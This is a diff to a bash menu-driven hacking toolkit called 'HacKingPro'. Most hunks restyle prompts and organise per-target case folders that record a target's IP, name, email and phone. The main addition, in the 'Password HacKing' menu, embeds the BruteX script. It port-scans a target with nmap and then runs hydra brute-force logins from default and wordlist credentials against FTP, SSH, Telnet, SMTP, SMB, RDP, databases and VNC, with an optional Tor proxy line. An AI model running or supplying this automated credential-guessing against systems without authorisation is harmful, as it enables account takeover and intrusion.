@@ -89,7 +89,7 @@ MyVersion="${BGreen}v4.0.0.4"
 HacKingPro=$(echo "${BRed}Hac${BYellow}King${BBlue}Pro")
 HacKingProPWD=$(pwd)
 HacKingProDavid=$(echo "\n\t  ${BRed}[${BCyan}✡${BRed}] ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
-HacKingProExit=$(echo "\n\t\t ${BRed}[${BCyan}✡${BRed}] ${BCyan}Exit ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
+HacKingProExit=$(echo "\n ${BRed}[${BCyan}✡${BRed}] ${BCyan}Exit ${HacKingPro} ${BRed}[${BCyan}✡${BRed}]\n\t\t ${BGreen}")
 
 Press_ENTER=$(echo "\n\n${BYellow}                🔶    Press ENTER    🔶     ${BGreen}\n\n")
 Press_Enter_To_START=$(echo "\n\n${BYellow}                🔶    Press Enter To START    🔶     ${BGreen}\n\n")
@@ -264,34 +264,59 @@ HacKingProPlanning(){
   clear
   HacKingProLogo1
   cd $XHacKingPro
-  echo "\n\t\t${BRed}[${LGrey}P${BRed}]${BBlue} - ${LGrey}Planning and Scoping\n"
+  echo "\n\t  ${BRed}[${LGrey}P${BRed}]${BBlue} - ${LGrey}Planning and Scoping\n"
+  HacKingProTargetStatus=$(echo "\n
+          ${BRed}[${DGrey}P${BRed}]${BBlue} -${DGrey} ⚡️ Planning and Scoping 🎯
+          ${BRed}=======================================================================================
+          ${BBlue}[${BRed}#${BBlue}] 🎯 ${LRed}Target IP${BBlue}: ${BRed}${targetIP}
+          ${BBlue}[${BRed}#${BBlue}] 🎯 ${LRed}Target Name${BBlue}: ${BRed}${targetNAME}
+          ${BBlue}[${BRed}#${BBlue}] 🎯 ${LRed}Target Email${BBlue}: ${BRed}${targetEmail}
+          ${BBlue}[${BRed}#${BBlue}] 🎯 ${LRed}Target Phone${BBlue}: ${BRed}${targetPhone}
+          ${BBlue}[${BRed}#${BBlue}] 🗓  ${LRed}Current Date${BBlue}: ${BRed} $(date)
+          ${BRed}=======================================================================================
+          ${BRed}[${DGrey}I${BRed}]${BBlue} - ${DGrey}Install HacKingPro On the System")
+  echo "$HacKingProTargetStatus"
+
   #
-  t2="$(echo "\n\t\t${BBlue}[${BRed}?${BBlue}]${BGreen} - Name of Target / Client: ${BRed}")"
+  t2="$(echo "\n${BBlue}[${BRed}?${BBlue}]${BGreen} - Name of Target / Client: ${BRed}")"
   read -p "$t2" targetNAME
   if [ -z $targetNAME ]; then
     #statements
     targetNAME="ChangeMe"
-    echo "\n\t\t${BRed}[${LGrey}TN${BRed}]${BBlue} - ${LGrey}Target Name ${BBlue} $targetNAME\n"
+    echo "\n${BRed}[${LGrey}TN${BRed}]${BBlue} - ${LGrey}Target Name ${BBlue} $targetNAME\n"
   fi
   #
   if [ -d Case ]; then
     #statements
-    echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}Case Folder Exists, Continue to it\n"
+    echo "\n\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BGreen}Case ${BYellow}Folder Exists, Continue to it\n"
     cd Case
-    echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
-    mkdir $targetNAME
-    cd $targetNAME
-    echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}Creating Case Planning and Continue to it\n"
-    mkdir Planning
-    cd Planning
+    if [ -d $targetNAME ]; then
+      #statements
+      echo "\n\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BGreen}$targetNAME ${BYellow}Folder Exists, Continue to it\n"
+      cd $targetNAME
+    else
+      mkdir $targetNAME
+      cd $targetNAME
+    fi
+    if [ -d Planning ]; then
+      #statements
+      echo "\n\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BGreen}$targetNAME/Planning ${BYellow}Folder Exists, Continue to it\n"
+      cd Planning
+    else
+      mkdir Planning
+      cd Planning
+    fi
   else
-    echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}Creating Case Folder and Continue to it\n"
+    echo "\n\t${BRed}[${BYellow}❌${BRed}]${BBlue} - ${BGreen}Case ${BYellow}Folder Not Exists, Create it\n"
+    echo "\n\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}Creating ${BGreen}Case ${BYellow}Folder and Continue to it\n"
     mkdir Case
     cd Case
-    echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
+
+    echo "\n\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}Creating ${BGreen}$targetNAME ${BYellow}and Continue to it\n"
     mkdir $targetNAME
     cd $targetNAME
-    echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}Creating Case Planning and Continue to it\n"
+
+    echo "\n\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}Creating ${BGreen}Case Planning ${BYellow}and Continue to it\n"
     mkdir Planning
     cd Planning
   fi
@@ -299,15 +324,15 @@ HacKingProPlanning(){
   #
   file="${targetNAME}-HacKingPro-Planning-Log.md"
   if [ -e ${file} ]; then
-    t5="$(echo "\n  ${BBlue}[${BRed}!${BBlue}] ${BRed}File Exist! ${LRed}Remove it? [yY/nN]: ")"
+    t5="$(echo "\n\t${BRed}[${BYellow}❌${BRed}]${BBlue} - ${BYellow}File ${BGreen}${targetNAME} ${BYellow}Exist! ${LRed}Remove it? ${BCyan}[yY/nN]: ")"
     read -p "$t5 " filexist
     case $filexist in
       y|Y)
-      echo "  ${BBlue}[${BGreen}!${BBlue}] ${BGreen}Removing {${targetNAME}-HacKingPro-Planning-Log.md} file .."
+      echo "\n\t${BBlue}[${BGreen}🧹${BBlue}] ${BGreen}Removing {${targetNAME}-HacKingPro-Planning-Log.md} file .."
       rm ${targetNAME}-HacKingPro-Planning-Log.md
       ;;
       n|N)
-      echo "  ${BBlue}[${BRed}!${BBlue}] Leaving {${targetNAME}-HacKingPro-Planning-Log.md} file and Add to it .."
+      echo "\n\t${BBlue}[${BGreen}🔶${BBlue}] ${BGreen}Leaving {${targetNAME}-HacKingPro-Planning-Log.md} file .."
       ;;
     esac
   fi
@@ -318,7 +343,7 @@ HacKingProPlanning(){
 
 
   #
-  t1="$(echo "\n\t\t${BBlue}[${BRed}?${BBlue}]${BGreen} - IP / Host of Target / Client: ${BRed}")"
+  t1="$(echo "\n${BBlue}[${BRed}?${BBlue}]${BGreen} - IP / Host of Target / Client: ${BRed}")"
   read -p "$t1" targetIP
   if [ -z $targetIP ]; then
     #statements
@@ -328,27 +353,30 @@ HacKingProPlanning(){
   echo "> - ### Target IP: ${targetIP}" >> ${targetNAME}-HacKingPro-Planning-Log.md
 
   #
-  t3="$(echo "\n\t\t${BBlue}[${BRed}?${BBlue}]${BGreen} - Email of Target: ${BRed}")"
+  t3="$(echo "\n${BBlue}[${BRed}?${BBlue}]${BGreen} - Email of Target: ${BRed}")"
   read -p "$t3" targetEmail
   if [ -z $targetEmail ]; then
     #statements
     targetEmail="ChangeMe"
-    echo "\n\t\t${BRed}[${LGrey}TE${BRed}]${BBlue} - ${LGrey}Target Email ${BBlue} $targetEmail\n"
+    echo "\n${BRed}[${LGrey}TE${BRed}]${BBlue} - ${LGrey}Target Email ${BBlue} $targetEmail\n"
   fi
   echo "> - ### Target Email: ${targetEmail}" >> ${targetNAME}-HacKingPro-Planning-Log.md
 
   #
-  t4="$(echo "\n\t\t${BBlue}[${BRed}?${BBlue}]${BGreen} - Phone of Target (With Country Code): ${BRed}")"
+  t4="$(echo "\n${BBlue}[${BRed}?${BBlue}]${BGreen} - Phone of Target (With Country Code): ${BRed}")"
   read -p "$t4" targetPhone
   if [ -z $targetPhone ]; then
     #statements
     targetPhone="ChangeMe"
-    echo "\n\t\t${BRed}Target Name: ${BRed} $targetPhone"
+    echo "\n${BRed}[${LGrey}TP${BRed}]${BBlue} - ${LGrey}Target Phone ${BBlue} $targetPhone\n"
   fi
   echo "> - ### Target Phone: ${targetPhone}" >> ${targetNAME}-HacKingPro-Planning-Log.md
 
   #
-  ls
+  echo "\n${BRed}[${BYellow}🔸${BRed}]${BBlue} - ${BYellow}Listing Case \n"
+  echo "${BYellow} Log Directory ${BRed}[${BGreen} $(pwd) ${BRed}]\n${BGreen}"
+  echo "${BYellow} Log File ${BRed}[${BGreen} $(ls) ${BRed}]\n${BGreen}"
+  read -p "$Press_ENTER" readthat
   cd $XHacKingPro
 }
 
@@ -358,7 +386,6 @@ MainMenu(){
   #statements
   clear
   HacKingProLogo1
-
   HacKingProTargetStatus=$(echo "\n
           ${BRed}[${DGrey}P${BRed}]${BBlue} -${DGrey} ⚡️ Planning and Scoping 🎯
           ${BRed}=======================================================================================
@@ -553,7 +580,7 @@ MainMenu(){
         HacKingProLogo1
         HacKingProMenuMain=$(echo "${BRed}
           ${BBlue}[${BYellow}01${BBlue}] ${BYellow} 📜 Information Gathering Menu
-          
+
 
           ${BRed}[${DGrey}P${BRed}]${BBlue} - ${DGrey} ⚡️ Planning and Scoping 🎯
           ${BRed}=======================================================================================
@@ -831,22 +858,22 @@ MainMenu(){
       #
       if [ -d Case ]; then
         #statements
-        echo "\n\t\t${BRed}[${BYellow}Found!${BRed}]${BBlue} - ${BYellow}Case Folder Exists, Continue to it\n"
+        echo "\n\t\t${BRed}[${BYellow}✅${BRed}]${BBlue} - ${BYellow}Case Folder Exists, Continue to it\n"
         cd Case
-        echo "\n\t\t${BRed}[${BYellow}Create!${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
         mkdir $targetNAME
         cd $targetNAME
-        echo "\n\t\t${BRed}[${BYellow}Create!${BRed}]${BBlue} - ${BYellow}Creating Reconnaissance and Continue to it\n"
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Reconnaissance and Continue to it\n"
         mkdir Reconnaissance
         cd Reconnaissance
       else
-        echo "\n\t\t${BRed}[${BYellow}Create!${BRed}]${BBlue} - ${BYellow}Creating Case Folder and Continue to it\n"
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Case Folder and Continue to it\n"
         mkdir Case
         cd Case
-        echo "\n\t\t${BRed}[${BYellow}Create!${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating $targetNAME and Continue to it\n"
         mkdir $targetNAME
         cd $targetNAME
-        echo "\n\t\t${BRed}[${BYellow}Create!${BRed}]${BBlue} - ${BYellow}Creating Reconnaissance and Continue to it\n"
+        echo "\n\t\t${BRed}[${BYellow}🔶${BRed}]${BBlue} - ${BYellow}Creating Reconnaissance and Continue to it\n"
         mkdir Reconnaissance
         cd Reconnaissance
       fi
@@ -920,7 +947,340 @@ MainMenu(){
       echo "\n\t\t${BRed}[${LGrey}04${BRed}]${BBlue} - ${DGrey}Database Assessment"
       ;;
       05|5 )
-      echo "\n\t\t${BRed}[${LGrey}05${BRed}]${BBlue} - ${DGrey}Password HacKing"
+      Brutex(){
+        cd "$xMenu05"
+        cd Brutex
+        # TARGET="$1"
+        # PORT="$2"
+        VER="2.3"
+        LOOT_DIR=./
+        FTP_USER_PASS="wordlists/ftp-default-userpass.txt"
+        FTP_USERS="wordlists/ftp_defuser.lst"
+        FTP_PASS="wordlists/ftp_defpass.lst"
+        SSH_USER_PASS="wordlists/ssh-default-userpass.txt"
+        SSH_USERS="wordlists/ssh_defuser.lst"
+        SSH_PASS="wordlists/ssh_defpass.lst"
+        SMTP_USERS="wordlists/smtp_defuser.lst"
+        SMTP_PASS="wordlists/smtp_defpass.lst"
+        POP_USERS="wordlists/pop_defuser.lst"
+        POP_PASS="wordlists/pop_defpass.lst"
+        TELNET_USER_PASS="wordlists/telnet-default-userpass.txt"
+        TELNET_USERS="wordlists/telnet_defuser.lst"
+        TELNET_PASS="wordlists/telnet_defpass.lst"
+        SQL_USERS="wordlists/sql_defuser.lst"
+        SQL_PASS="wordlists/sql_defpass.lst"
+        MSSQL_USER_PASS="wordlists/mssql-default-userpass.txt"
+        MYSQL_USER_PASS="wordlists/mysql-default-userpass.txt"
+        ORACLE_USER_PASS="wordlists/oracle-default-userpass.txt"
+        POSTGRES_USER_PASS="wordlists/postgres-default-userpass.txt"
+        WINDOWS_USER_LIST="wordlists/windows-users.txt"
+        WINDOWS_USER_PASS="wordlists/windows-default-userpass.txt"
+        USER_FILE="wordlists/simple-users.txt"
+        PASS_FILE="wordlists/password.lst"
+        SNMP_FILE="wordlists/snmp-strings.txt"
+        VNC_FILE="wordlists/vnc-default-passwords.txt"
+        HTTP_LOCATION="/"
+        THREADS="30"
+        COLOR1='\033[91m'
+        COLOR2='\033[92m'
+        COLOR3='\033[92m'
+        RESET='\e[0m'
+
+        # UN-COMMENT TO ENABLE PROXY
+        #export HYDRA_PROXY=socks4://127.0.0.1:9050
+
+        if [ -z $targetIP ]; then
+          echo "$COLOR1 __________                __         ____  ___$Color_Off"
+          echo "$COLOR1 \______   \_______ __ ___/  |_  ____ \   \/  /$Color_Off"
+          echo "$COLOR1  |    |  _/\_  __ \  |  \   __\/ __ \ \     / $Color_Off"
+          echo "$COLOR1  |    |   \ |  | \/  |  /|  | \  ___/ /     \ $Color_Off"
+          echo "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $Color_Off"
+          echo "$COLOR1         \/                         \/      \_/$Color_Off"
+          echo ""
+          echo "$COLOR1 + -- --=[ BruteX v$VER by @xer0dayz$Color_Off"
+          echo "$COLOR1 + -- --=[ https://sn1persecurity.com$Color_Off"
+          echo "$COLOR1 + -- --=[ Usage: brutex <target> <port>"
+          echo "$Color_Off"
+          exit
+        fi
+
+        DIR=$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )
+
+        echo "$COLOR1 __________                __         ____  ___$Color_Off"
+        echo "$COLOR1 \______   \_______ __ ___/  |_  ____ \   \/  /$Color_Off"
+        echo "$COLOR1  |    |  _/\_  __ \  |  \   __\/ __ \ \     / $Color_Off"
+        echo "$COLOR1  |    |   \ |  | \/  |  /|  | \  ___/ /     \ $Color_Off"
+        echo "$COLOR1  |______  / |__|  |____/ |__|  \___  >___/\  \ $Color_Off"
+        echo "$COLOR1         \/                         \/      \_/$Color_Off"
+        echo ""
+        echo "$COLOR1 + -- --=[ BruteX v$VER by @xer0dayz$Color_Off"
+        echo "$COLOR1 + -- --=[ http://sn1persecurity.com$Color_Off"
+        echo ""
+        echo ""
+
+        echo "$COLOR3################################### Running Port Scan ##############################$Color_Off"
+        if [ -z "$PORT" ]
+        then
+          nmap -T4 -P0 --open $targetIP -p21,22,23,25,53,80,110,139,162,389,443,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901,8000,8080,6667 -oX $LOOT_DIR/nmap-${TARGET}.xml
+        else
+          nmap -T4 -P0 --open $targetIP -p $PORT -oX $LOOT_DIR/nmap-${TARGET}.xml
+        fi
+        echo ""
+        echo "$COLOR3################################### Running Brute Force ############################$Color_Off"
+        echo ""
+        port_21=`grep 'portid="21"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_22=`grep 'portid="22"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_23=`grep 'portid="23"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_25=`grep 'portid="25"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_80=`grep 'portid="80"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_110=`grep 'portid="110"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_139=`grep 'portid="139"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_162=`grep 'portid="162"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_389=`grep 'portid="389"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_443=`grep 'portid="443"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_445=`grep 'portid="445"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_512=`grep 'portid="512"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_513=`grep 'portid="513"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_512=`grep 'portid="514"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_993=`grep 'portid="993"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_1433=`grep 'portid="1433"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_1521=`grep 'portid="1521"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_3306=`grep 'portid="3306"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_3389=`grep 'portid="3389"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_5432=`grep 'portid="5432"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_5900=`grep 'portid="5900"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_5901=`grep 'portid="5901"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+        port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap-${TARGET}.xml | grep open`
+
+        if [ -z "$port_21" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 21 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 21 opened... running tests...$Color_Off"
+          hydra -C $FTP_USER_PASS $targetIP ftp -t $THREADS -e ns
+          hydra -L $FTP_USERS -P $FTP_PASS $targetIP ftp -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_22" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 22 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 22 opened... running tests...$Color_Off"
+          hydra -C $SSH_USER_PASS $targetIP ssh -t $THREADS -e ns
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP ssh -t $THREADS -e ns
+          hydra -L $SSH_USERS -P $SSH_PASS $targetIP ssh -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_23" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 23 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 23 opened... running tests...$Color_Off"
+          hydra -C $TELNET_USER_PASS $targetIP telnet -t $THREADS -e ns
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP telnet -t $THREADS -e ns
+          hydra -L $TELNET_USERS -P $TELNET_PASS $targetIP telnet -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_25" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 25 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 25 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP smtp-enum -t $THREADS -e ns
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP smtp -t $THREADS -e ns
+          hydra -L $SMTP_USERS -P $SMTP_PASS $targetIP smtp -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_80" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 80 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 80 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-get
+        fi
+
+        if [ -z "$port_110" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 110 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 110 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP pop3 -t $THREADS -e ns
+          hydra -L $POP_USERS -P $POP_PASS $targetIP pop3 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_139" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 139 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 139 opened... running tests...$Color_Off"
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP smb -S 139 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_162" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 162 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 162 opened... running tests...$Color_Off"
+          hydra -P $SNMP_FILE snmp -S 162 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_389" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 389 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 389 opened... running tests...$Color_Off"
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP ldap2 -S 389 -t $THREADS -e ns
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP ldap3 -S 389 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_443" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 443 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 443 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP https-get
+        fi
+
+        if [ -z "$port_445" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 445 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 445 opened... running tests...$Color_Off"
+          hydra -C $WINDOWS_USER_PASS $targetIP smb -S 445 -t $THREADS -e ns
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP smb -S 445 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_512" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 512 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 512 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP rexec -S 512 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_513" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 513 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 513 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP rlogin -S 513 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_514" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 514 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 514 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP rsh -S 514 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_993" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 993 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 993 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP imap -S 993 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_1433" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 1433 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 1433 opened... running tests...$Color_Off"
+          hydra -C $MSSQL_USER_PASS $targetIP mssql -S 1433 -t $THREADS -e ns
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP mssql -S 1433 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_1521" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 1521 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 1521 opened... running tests...$Color_Off"
+          hydra -C $ORACLE_USER_PASS $targetIP oracle -S 1521 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_3306" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 3306 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 3306 opened... running tests...$Color_Off"
+          hydra -C $MYSQL_USER_PASS $targetIP mysql -t $THREADS -e ns
+          hydra -L $SQL_USERS -P $SQL_PASS $targetIP mysql -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_3389" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 3389 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 3389 opened... running tests...$Color_Off"
+          hydra -C $WINDOWS_USER_PASS $targetIP rdp -t $THREADS -e ns
+          hydra -L $WINDOWS_USER_LIST -P $PASS_FILE $targetIP rdp -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_5432" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 5432 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 5432 opened... running tests...$Color_Off"
+          hydra -C $POSTGRES_USER_PASS $targetIP postgres -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_5900" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 5900 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 5900 opened... running tests...$Color_Off"
+          hydra -P $VNC_FILE $targetIP vnc -S 5900 -t $THREADS -e ns
+          hydra -P $PASS_FILE $targetIP vnc -S 5900 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_5901" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 5901 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 5901 opened... running tests...$Color_Off"
+          hydra -P $VNC_FILE $targetIP vnc -S 5901 -t $THREADS -e ns
+          hydra -P $PASS_FILE $targetIP vnc -S 5901 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_6667" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 6667 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 6667 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP irc -s 6667 -t $THREADS -e ns
+        fi
+
+        if [ -z "$port_8000" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 8000 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 8000 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-head -s 8000 -f -q -t $THREADS -e ns -m /
+        fi
+
+        if [ -z "$port_8080" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 8080 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 8080 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-head
+        fi
+
+        if [ -z "$port_8100" ]
+        then
+          echo "$COLOR1 + -- --=[ Port 8100 closed... skipping.$Color_Off"
+        else
+          echo "$COLOR2 + -- --=[ Port 8100 opened... running tests...$Color_Off"
+          hydra -L $USER_FILE -P $PASS_FILE $targetIP http-head -S 8100 -f -q -t $THREADS -e ns -m /
+        fi
+
+        echo ""
+        echo "$COLOR3################################### Done! ###########################################$Color_Off"
+        read -p "$Press_ENTER" readthat
+      }
       MainMenu(){
         while true; do
         #statements
@@ -942,7 +1302,7 @@ MainMenu(){
 
           echo "$HacKingProTargetStatus""
 
-          ${BRed}[${BYellow}KoTH${BRed}]${BBlue} - ${BYellow}🤴🏼 King of The Hill ⛰
+          ${BRed}[${DGrey}01${BRed}]${BBlue} - ${DGrey}🤴 Brutex
 
           ${BRed}[${LGrey}x${BRed}]${BWhite} -${DGrey} Exit / Quit / Close
 
@@ -951,7 +1311,8 @@ MainMenu(){
           read -p "$HacKingProMenuMain" cmd
           case $cmd in
             1|01 )
-            read -p "$Press_ENTER" readthat
+            Brutex
+            # read -p "$Press_ENTER" readthat
             ;;
             x|X|exit|quit|Exit )
             clear
@@ -1139,14 +1500,14 @@ MainMenu(){
         HacKingProTargetStatus=$(echo "\n
           ${BRed}[${DGrey}P${BRed}]${BBlue} -${DGrey} ⚡️ Planning and Scoping 🎯
           ${BYellow}=======================================================================================
-          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}VPN IP${BBlue}: ${BRed}${tryhackmeVpnIP}
-          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}Target IP${BBlue}: ${BRed}${targetIP}
-          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}Target Name${BBlue}: ${BRed}${targetNAME}
-          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}Target Email${BBlue}: ${BRed}${targetEmail}
-          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}Target Phone${BBlue}: ${BRed}${targetPhone}
-          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}Target Log Name${BBlue}: ${BRed}${targetLogNAME}
-          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}TryHackMe UserName${BBlue}: ${BRed}${username}
-          ${BBlue}[${BYellow}#${BBlue}] 🗓  ${BYellow}Current Date${BBlue}: ${BRed} $(date)
+          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}VPN IP${BBlue}: ${BGreen}${tryhackmeVpnIP}
+          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}Target IP${BBlue}: ${BGreen}${targetIP}
+          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}Target Name${BBlue}: ${BGreen}${targetNAME}
+          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}Target Email${BBlue}: ${BGreen}${targetEmail}
+          ${BBlue}[${BYellow}#${BBlue}] 🎯 ${BYellow}Target Phone${BBlue}: ${BGreen}${targetPhone}
